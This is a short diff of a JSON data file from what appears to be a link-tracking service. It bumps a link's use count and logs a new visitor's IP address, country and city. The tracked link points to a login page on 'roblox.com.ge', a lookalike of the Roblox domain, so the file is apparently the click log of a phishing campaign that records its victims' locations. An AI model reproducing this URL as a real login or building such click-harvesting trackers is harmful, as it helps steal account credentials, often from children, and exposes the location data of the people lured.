@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1600,
+    "useCount": 1601,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12968,6 +12968,14 @@
         "city": "Warsaw",
         "flag": "🇵🇱",
         "countryCode": "PL"
+      },
+      {
+        "timestamp": 1777504038681,
+        "ip": "181.78.44.8",
+        "country": "Honduras",
+        "city": "Carbajales",
+        "flag": "🇭🇳",
+        "countryCode": "HN"
       }
     ]
   },
